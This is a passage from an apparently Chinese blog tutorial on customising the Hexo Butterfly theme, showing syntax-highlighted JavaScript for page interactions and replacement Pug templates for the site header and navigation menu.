language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;#article-container .hide-button&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> ($hideInline.<span class="property">length</span>) &#123;</span><br><span class="line">      $hideInline.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">item</span>) &#123;</span><br><span class="line">        item.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">          <span class="keyword">const</span> $this = <span class="variable language_">this</span></span><br><span class="line">          $this.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;open&#x27;</span>)</span><br><span class="line">          <span class="keyword">const</span> $fjGallery = $this.<span class="property">nextElementSibling</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.fj-gallery&#x27;</span>)</span><br><span class="line">          $fjGallery.<span class="property">length</span> &amp;&amp; btf.<span class="title function_">initJustifiedGallery</span>($fjGallery)</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> tabsFn = &#123;</span><br><span class="line">    <span class="attr">clickFnOfTabs</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;#article-container .tab &gt; button&#x27;</span>).<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">item</span>) &#123;</span><br><span class="line">        item.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">          <span class="keyword">const</span> $this = <span class="variable language_">this</span></span><br><span class="line">          <span class="keyword">const</span> $tabItem = $this.<span class="property">parentNode</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (!$tabItem.<span class="property">classList</span>.<span class="title function_">contains</span>(<span class="string">&#x27;active&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">const</span> $tabContent = $tabItem.<span class="property">parentNode</span>.<span class="property">nextElementSibling</span></span><br><span class="line">            <span class="keyword">const</span> $siblings = btf.<span class="title function_">siblings</span>($tabItem, <span class="string">&#x27;.active&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            $siblings &amp;&amp; $siblings.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;active&#x27;</span>)</span><br><span class="line">            $tabItem.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;active&#x27;</span>)</span><br><span class="line">            <span class="keyword">const</span> tabId = $this.<span class="title function_">getAttribute</span>(<span class="string">&#x27;data-href&#x27;</span>).<span class="title function_">replace</span>(<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">const</span> childList = [...$tabContent.<span class="property">children</span>]</span><br><span class="line">            childList.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">              <span class="keyword">if</span> (item.<span class="property">id</span> === tabId) item.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;active&#x27;</span>)</span><br><span class="line">              <span class="keyword">else</span> item.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;active&#x27;</span>)</span><br><span class="line">            &#125;)</span><br><span class="line">            <span class="keyword">const</span> $isTabJustifiedGallery = $tabContent.<span class="title function_">querySelectorAll</span>(<span class="string">`#<span class="subst">$&#123;tabId&#125;</span> .fj-gallery`</span>)</span><br><span class="line">            <span class="keyword">if</span> ($isTabJustifiedGallery.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">              btf.<span class="title function_">initJustifiedGallery</span>($isTabJustifiedGallery)</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">backToTop</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;#article-container .tabs .tab-to-top&#x27;</span>).<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">item</span>) &#123;</span><br><span class="line">        item.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">          btf.<span class="title function_">scrollToDest</span>(btf.<span class="title function_">getEleTop</span>(btf.<span class="title function_">getParents</span>(<span class="variable language_">this</span>, <span class="string">&#x27;.tabs&#x27;</span>)), <span class="number">300</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> toggleCardCategory = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> $cardCategory = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;#aside-cat-list .card-category-list-item.parent i&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> ($cardCategory.<span class="property">length</span>) &#123;</span><br><span class="line">      $cardCategory.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">item</span>) &#123;</span><br><span class="line">        item.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">          e.<span class="title function_">preventDefault</span>()</span><br><span class="line">          <span class="keyword">const</span> $this = <span class="variable language_">this</span></span><br><span class="line">          $this.<span class="property">classList</span>.<span class="title function_">toggle</span>(<span class="string">&#x27;expand&#x27;</span>)</span><br><span class="line">          <span class="keyword">const</span> $parentEle = $this.<span class="property">parentNode</span>.<span class="property">nextElementSibling</span></span><br><span class="line">          <span class="keyword">if</span> (btf.<span class="title function_">isHidden</span>($parentEle)) &#123;</span><br><span class="line">            $parentEle.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;block&#x27;</span></span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $parentEle.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> switchComments = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> switchDone = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">const</span> $switchBtn = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#comment-switch &gt; .switch-btn&#x27;</span>)</span><br><span class="line">    $switchBtn &amp;&amp; $switchBtn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">classList</span>.<span class="title function_">toggle</span>(<span class="string">&#x27;move&#x27;</span>)</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;#post-comment &gt; .comment-wrap &gt; div&#x27;</span>).<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">item</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (btf.<span class="title function_">isHidden</span>(item)) &#123;</span><br><span class="line">          item.<span class="property">style</span>.<span class="property">cssText</span> = <span class="string">&#x27;display: block;animation: tabshow .5s&#x27;</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          item.<span class="property">style</span>.<span class="property">cssText</span> = <span class="string">&quot;display: none;animation: &#x27;&#x27;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!switchDone &amp;&amp; <span class="keyword">typeof</span> loadOtherComment === <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">        switchDone = <span class="literal">true</span></span><br><span class="line">        <span class="title function_">loadOtherComment</span>()</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> addPostOutdateNotice = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> data = <span class="variable constant_">GLOBAL_CONFIG</span>.<span class="property">noticeOutdate</span></span><br><span class="line">    <span class="keyword">const</span> diffDay = btf.<span class="title function_">diffDate</span>(<span class="variable constant_">GLOBAL_CONFIG_SITE</span>.<span class="property">postUpdate</span>)</span><br><span class="line">    <span class="keyword">if</span> (diffDay &gt;= data.<span class="property">limitDay</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> ele = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>)</span><br><span class="line">      ele.<span class="property">className</span> = <span class="string">&#x27;post-outdate-notice&#x27;</span></span><br><span class="line">      ele.<span class="property">textContent</span> = data.<span class="property">messagePrev</span> + <span class="string">&#x27; &#x27;</span> + diffDay + <span class="string">&#x27; &#x27;</span> + data.<span class="property">messageNext</span></span><br><span class="line">      <span class="keyword">const</span> $targetEle = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;article-container&#x27;</span>)</span><br><span class="line">      <span class="keyword">if</span> (data.<span class="property">position</span> === <span class="string">&#x27;top&#x27;</span>) &#123;</span><br><span class="line">        $targetEle.<span class="title function_">insertBefore</span>(ele, $targetEle.<span class="property">firstChild</span>)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $targetEle.<span class="title function_">appendChild</span>(ele)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">lazyloadImg</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">lazyLoadInstance</span> = <span class="keyword">new</span> <span class="title class_">LazyLoad</span>(&#123;</span><br><span class="line">      <span class="attr">elements_selector</span>: <span class="string">&#x27;img&#x27;</span>,</span><br><span class="line">      <span class="attr">threshold</span>: <span class="number">0</span>,</span><br><span class="line">      <span class="attr">data_src</span>: <span class="string">&#x27;lazy-src&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> relativeDate = <span class="keyword">function</span> (<span class="params">selector</span>) &#123;</span><br><span class="line">    selector.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> $this = item</span><br><span class="line">      <span class="keyword">const</span> timeVal = $this.<span class="title function_">getAttribute</span>(<span class="string">&#x27;datetime&#x27;</span>)</span><br><span class="line">      $this.<span class="property">innerText</span> = btf.<span class="title function_">diffDate</span>(timeVal, <span class="literal">true</span>)</span><br><span class="line">      $this.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;inline&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> unRefreshFn = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;resize&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">adjustMenu</span>(<span class="literal">false</span>)</span><br><span class="line">      btf.<span class="title function_">isHidden</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;toggle-menu&#x27;</span>)) &amp;&amp; mobileSidebarOpen &amp;&amp; sidebarFn.<span class="title function_">close</span>()</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;menu-mask&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="params">e</span> =&gt;</span> &#123; sidebarFn.<span class="title function_">close</span>() &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">clickFnOfSubMenu</span>()</span><br><span class="line">    <span class="variable constant_">GLOBAL_CONFIG</span>.<span class="property">islazyload</span> &amp;&amp; <span class="title function_">lazyloadImg</span>()</span><br><span class="line">    <span class="variable constant_">GLOBAL_CONFIG</span>.<span class="property">copyright</span> !== <span class="literal">undefined</span> &amp;&amp; <span class="title function_">addCopyright</span>()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">refreshFn</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">initAdjust</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable constant_">GLOBAL_CONFIG_SITE</span>.<span class="property">isPost</span>) &#123;</span><br><span class="line">      <span class="variable constant_">GLOBAL_CONFIG</span>.<span class="property">noticeOutdate</span> !== <span class="literal">undefined</span> &amp;&amp; <span class="title function_">addPostOutdateNotice</span>()</span><br><span class="line">      <span class="variable constant_">GLOBAL_CONFIG</span>.<span class="property">relativeDate</span>.<span class="property">post</span> &amp;&amp; <span class="title function_">relativeDate</span>(<span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;#post-meta time&#x27;</span>))</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable constant_">GLOBAL_CONFIG</span>.<span class="property">relativeDate</span>.<span class="property">homepage</span> &amp;&amp; <span class="title function_">relativeDate</span>(<span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;#recent-posts time&#x27;</span>))</span><br><span class="line">      <span class="variable constant_">GLOBAL_CONFIG</span>.<span class="property">runtime</span> &amp;&amp; <span class="title function_">addRuntime</span>()</span><br><span class="line">      <span class="title function_">addLastPushDate</span>()</span><br><span class="line">      <span class="title function_">toggleCardCategory</span>()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">scrollFnToDo</span>()</span><br><span class="line">    <span class="variable constant_">GLOBAL_CONFIG_SITE</span>.<span class="property">isHome</span> &amp;&amp; <span class="title function_">scrollDownInIndex</span>()</span><br><span class="line">    <span class="title function_">addHighlightTool</span>()</span><br><span class="line">    <span class="variable constant_">GLOBAL_CONFIG</span>.<span class="property">isPhotoFigcaption</span> &amp;&amp; <span class="title function_">addPhotoFigcaption</span>()</span><br><span class="line">    <span class="title function_">scrollFn</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> $jgEle = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;#article-container .fj-gallery&#x27;</span>)</span><br><span class="line">    $jgEle.<span class="property">length</span> &amp;&amp; <span class="title function_">runJustifiedGallery</span>($jgEle)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">runLightbox</span>()</span><br><span class="line">    <span class="title function_">addTableWrap</span>()</span><br><span class="line">    <span class="title function_">clickFnOfTagHide</span>()</span><br><span class="line">    tabsFn.<span class="title function_">clickFnOfTabs</span>()</span><br><span class="line">    tabsFn.<span class="title function_">backToTop</span>()</span><br><span class="line">    <span class="title function_">switchComments</span>()</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;toggle-menu&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123; sidebarFn.<span class="title function_">open</span>() &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">refreshFn</span>()</span><br><span class="line">  <span class="title function_">unRefreshFn</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="4-替换Blog根目录-themes-butterfly-layout-includes-header-index-pug为下列代码："><a href="#4-替换Blog根目录-themes-butterfly-layout-includes-header-index-pug为下列代码：" class="headerlink" title="4. 替换Blog根目录/themes/butterfly/layout/includes/header/index.pug为下列代码："></a>4. 替换<code>Blog根目录/themes/butterfly/layout/includes/header/index.pug</code>为下列代码：</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">if</span> <span class="type">!theme.disable_top_img</span> <span class="string">&amp;&amp;</span> <span class="string">page.top_img</span> <span class="type">!==</span> <span class="literal">false</span></span><br><span class="line">  <span class="string">if</span> <span class="string">is_post()</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">var</span> <span class="string">top_img</span> <span class="string">=</span> <span class="string">page.top_img</span> <span class="string">||</span> <span class="string">page.cover</span> <span class="string">||</span> <span class="string">page.randomcover</span></span><br><span class="line">  <span class="string">else</span> <span class="string">if</span> <span class="string">is_page()</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">var</span> <span class="string">top_img</span> <span class="string">=</span> <span class="string">page.top_img</span> <span class="string">||</span> <span class="string">theme.default_top_img</span></span><br><span class="line">  <span class="string">else</span> <span class="string">if</span> <span class="string">is_tag()</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">var</span> <span class="string">top_img</span> <span class="string">=</span> <span class="string">theme.tag_per_img</span> <span class="string">&amp;&amp;</span> <span class="string">theme.tag_per_img[page.tag]</span> </span><br><span class="line">    <span class="bullet">-</span> <span class="string">top_img</span> <span class="string">=</span> <span class="string">top_img</span> <span class="string">?</span> <span class="attr">top_img :</span> <span class="string">(theme.tag_img</span> <span class="type">!==</span> <span class="literal">false</span> <span class="string">?</span> <span class="string">theme.tag_img</span> <span class="string">||</span> <span class="attr">theme.default_top_img :</span> <span class="literal">false</span><span class="string">)</span></span><br><span class="line">  <span class="string">else</span> <span class="string">if</span> <span class="string">is_category()</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">var</span> <span class="string">top_img</span> <span class="string">=</span> <span class="string">theme.category_per_img</span> <span class="string">&amp;&amp;</span> <span class="string">theme.category_per_img[page.category]</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">top_img</span> <span class="string">=</span> <span class="string">top_img</span> <span class="string">?</span> <span class="attr">top_img :</span> <span class="string">(theme.category_img</span> <span class="type">!==</span> <span class="literal">false</span> <span class="string">?</span> <span class="string">theme.category_img</span> <span class="string">||</span> <span class="attr">theme.default_top_img :</span> <span class="literal">false</span><span class="string">)</span></span><br><span class="line">  <span class="string">else</span> <span class="string">if</span> <span class="string">is_home()</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">var</span> <span class="string">top_img</span> <span class="string">=</span> <span class="string">theme.index_img</span> <span class="type">!==</span> <span class="literal">false</span> <span class="string">?</span> <span class="string">theme.index_img</span> <span class="string">||</span> <span class="attr">theme.default_top_img :</span> <span class="literal">false</span></span><br><span class="line">  <span class="string">else</span> <span class="string">if</span> <span class="string">is_archive()</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">var</span> <span class="string">top_img</span> <span class="string">=</span> <span class="string">theme.archive_img</span> <span class="type">!==</span> <span class="literal">false</span> <span class="string">?</span> <span class="string">theme.archive_img</span> <span class="string">||</span> <span class="attr">theme.default_top_img :</span> <span class="literal">false</span></span><br><span class="line">  <span class="string">else</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">var</span> <span class="string">top_img</span> <span class="string">=</span> <span class="string">page.top_img</span> <span class="string">||</span> <span class="string">theme.default_top_img</span></span><br><span class="line"></span><br><span class="line">  <span class="string">if</span> <span class="string">top_img</span> <span class="type">!==</span> <span class="literal">false</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">var</span> <span class="string">imgSource</span> <span class="string">=</span> <span class="string">top_img</span> <span class="string">&amp;&amp;</span> <span class="string">top_img.indexOf(&#x27;/&#x27;)</span> <span class="type">!==</span> <span class="number">-1</span> <span class="string">?</span> <span class="string">`background-image:</span> <span class="string">url(&#x27;$&#123;url_for(top_img)&#125;&#x27;)`</span> <span class="string">:</span> <span class="string">`background:</span> <span class="string">$&#123;top_img&#125;`</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">var</span> <span class="string">bg_img</span> <span class="string">=</span> <span class="string">top_img</span> <span class="string">?</span> <span class="attr">imgSource :</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">var</span> <span class="string">site_title</span> <span class="string">=</span> <span class="string">page.title</span> <span class="string">||</span> <span class="string">page.tag</span> <span class="string">||</span> <span class="string">page.category</span> <span class="string">||</span> <span class="string">config.title</span></span><br><span class="line"></span><br><span class="line">    <span class="bullet">-</span> <span class="string">var</span> <span class="string">isHomeClass</span> <span class="string">=</span> <span class="string">is_home()</span> <span class="string">?</span> <span class="string">&#x27;full_page nav-fixed nav-visible&#x27;</span> <span class="string">:</span> <span class="string">&#x27;not-home-page&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">is_post()</span> <span class="string">?</span> <span class="string">isHomeClass</span> <span class="string">=</span> <span class="string">&#x27;post-bg&#x27;</span> <span class="string">:</span> <span class="string">isHomeClass</span></span><br><span class="line">  <span class="string">else</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">var</span> <span class="string">isHomeClass</span> <span class="string">=</span> <span class="string">&#x27;not-top-img&#x27;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">var</span> <span class="string">top_img</span> <span class="string">=</span> <span class="literal">false</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">var</span> <span class="string">isHomeClass</span> <span class="string">=</span> <span class="string">&#x27;not-top-img&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">header#page-header(class=isHomeClass</span> <span class="string">style=bg_img)</span></span><br><span class="line">  <span class="type">!=partial(&#x27;includes/header/nav&#x27;,</span> &#123;&#125;<span class="string">,</span> &#123;<span class="attr">cache:</span> <span class="literal">true</span>&#125;<span class="string">)</span></span><br><span class="line">  <span class="string">if</span> <span class="string">top_img</span> <span class="type">!==</span> <span class="literal">false</span></span><br><span class="line">    <span class="string">if</span> <span class="string">is_post()</span></span><br><span class="line">      <span class="string">include</span> <span class="string">./post-info.pug</span></span><br><span class="line">    <span class="string">else</span> <span class="string">if</span> <span class="string">is_home()</span> </span><br><span class="line">      <span class="comment">#site-info</span></span><br><span class="line">        <span class="string">h1#site-title=site_title</span></span><br><span class="line">        <span class="string">if</span> <span class="string">theme.subtitle.enable</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">var</span> <span class="string">loadSubJs</span> <span class="string">=</span> <span class="literal">true</span></span><br><span class="line">          <span class="comment">#site-subtitle</span></span><br><span class="line">            <span class="string">span#subtitle</span></span><br><span class="line">        <span class="string">if(theme.social)</span></span><br><span class="line">          <span class="comment">#site_social_icons</span></span><br><span class="line">            <span class="type">!=fragment_cache(&#x27;social&#x27;,</span> <span class="string">function()&#123;return</span> <span class="string">partial(&#x27;includes/header/social&#x27;)&#125;)</span></span><br><span class="line">      <span class="comment">#scroll-down</span></span><br><span class="line">        <span class="string">i.fas.fa-angle-down.scroll-down-effects</span></span><br><span class="line">    <span class="string">else</span></span><br><span class="line">      <span class="comment">#page-site-info</span></span><br><span class="line">        <span class="string">h1#site-title=site_title</span></span><br></pre></td></tr></table></figure><h3 id="5-替换Blog根目录-themes-butterfly-layout-includes-header-nav-pug为下列代码"><a href="#5-替换Blog根目录-themes-butterfly-layout-includes-header-nav-pug为下列代码" class="headerlink" title="5. 替换Blog根目录/themes/butterfly/layout/includes/header/nav.pug为下列代码"></a>5. 替换<code>Blog根目录/themes/butterfly/layout/includes/header/nav.pug</code>为下列代码</h3><p><code>ps</code>：代码中的内容、链接及图标可自行替换</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="string">const</span> &#123; <span class="string">darkmode</span> &#125; <span class="string">=</span> <span class="string">theme</span></span><br><span class="line"><span class="string">nav#nav</span></span><br><span class="line">  <span class="string">span#blog_name</span></span><br><span class="line">    <span class="string">.back-home-button(tabindex=&#x27;-1&#x27;)</span></span><br><span class="line">      <span class="string">i.back-home-button-icon.fas.fa-grip-vertical</span></span><br><span class="line">      <span class="string">.back-menu-list-groups</span></span><br><span class="line">        <span class="string">.back-menu-list-group</span></span><br><span class="line">          <span class="string">//.back-menu-list-title</span> <span class="string">网页</span></span><br><span class="line">          <span class="string">.back-menu-list</span></span><br><span class="line">            <span class="string">a.back-menu-item(href=&#x27;https://www.dqywy.top&#x27;,</span> <span class="string">title=&#x27;前往首页&#x27;,</span> <span class="string">target=&#x27;_blank&#x27;,</span> <span class="string">one-link-mark=&#x27;yes&#x27;)</span></span><br><span class="line">              <span class="string">img.back-menu-item-icon(src=&#x27;https://s1.ax1x.com/2023/05/21/p95hrtI.png&#x27;)</span></span><br><span class="line">              <span class="string">span.back-menu-item-text</span> <span class="string">首页</span></span><br><span class="line">            <span class="string">a.back-menu-item(href=&#x27;https://github.com/hellodqy&#x27;,</span> <span class="string">rel=&#x27;external</span> <span class="string">nofollow&#x27;,</span> <span class="string">title=&#x27;前往Github&#x27;,</span> <span class="string">target=&#x27;_blank&#x27;,</span> <span class="string">one-link-mark=&#x27;yes&#x27;)</span></span><br><span class="line">              <span class="string">img.back-menu-item-icon(src=&#x27;https://s1.ax1x.com/2023/05/21/p955aod.png&#x27;)</span></span><br><span class="line">              <span class="string">span.back-menu-item-text</span> <span class="string">Github</span></span><br><span class="line">            <span class="string">a.back-menu-item(href=&#x27;https://bz.zzzmh.cn/index&#x27;,</span> <span class="string">rel=&#x27;external</span> <span class="string">nofollow&#x27;,</span> <span class="string">title=&#x27;前往壁纸库&#x27;,</span> <span class="string">target=&#x27;_blank&#x27;,</span> <span class="string">one-link-mark=&#x27;yes&#x27;)</span></span><br><span class="line">              <span class="string">img.back-menu-item-icon(src=&#x27;https://s1.ax1x.com/2023/05/21/p955ZsU.png&#x27;)</span></span><br><span class="line">              <span class="string">span.back-menu-item-text</span> <span class="string">超赞壁纸</span></span><br><span class="line">            <span class="string">a.back-menu-item(href=&#x27;https://www.iconfont.cn&#x27;,</span> <span class="string">rel=&#x27;noopener</span> <span class="string">nofollow&#x27;,</span> <span class="string">title=&#x27;前往阿里icon&#x27;,</span> <span class="string">target=&#x27;_blank&#x27;,</span> <span class="string">one-link-mark=&#x27;yes&#x27;)</span></span><br><span class="line">              <span class="string">img.back-menu-item-icon(src=&#x27;https://s1.ax1x.com/2023/05/21/p9544KO.png&#x27;)</span></span><br><span class="line">              <span class="string">span.back-menu-item-text</span> <span class="string">阿里图标库</span></span><br><span class="line">    <span class="string">a#site-name(href=url_for(&#x27;/&#x27;))</span></span><br><span class="line">      <span class="string">.title</span> <span class="comment">#[=config.title]</span></span><br><span class="line">      <span class="string">i.fa-solid.fa-house</span></span><br><span class="line"></span><br><span class="line">  <span class="string">div.mask-name-container</span></span><br><span class="line">    <span class="string">center(id=&quot;name-container&quot;)</span></span><br><span class="line">      <span class="string">a(id=&quot;page-name&quot;</span> <span class="string">href=&quot;javascript:btf.scrollToDest(0,</span> <span class="number">500</span><span class="string">)&quot;)</span> <span class="string">今天也要元气满满^_^</span></span><br><span 